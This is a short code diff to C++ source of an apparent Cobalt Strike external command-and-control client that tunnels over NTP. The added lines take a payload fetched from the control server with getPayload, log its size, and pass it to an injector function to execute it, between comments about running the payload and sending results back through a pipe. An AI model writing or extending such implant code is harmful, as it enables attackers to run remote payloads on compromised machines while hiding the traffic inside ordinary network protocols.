@@ -11,6 +11,7 @@ CS-EXTC2-NTP
 #include "helpers.hpp"
 #include "net.hpp"
 #include <vector>
+#include "injector.hpp"
 
 std::vector<uint8_t> size_tToBytes(size_t value) {
 	std::vector<uint8_t> bytes(sizeof(size_t));
@@ -195,7 +196,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> sessionId) {
 	}
 
 	//3. This should now be the payload data. 
-
+	std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved";
 
 	return payloadBuffer;
 }
@@ -236,7 +237,7 @@ int main() {
 	std::vector<uint8_t> payloadBytes = getPayload(sessionId);
 
 	//2. run payload
-
+	injector(payloadBytes);
 	//3. read from pipe & send back
 	//sess id is here cuz it's per comm to track chunking
 
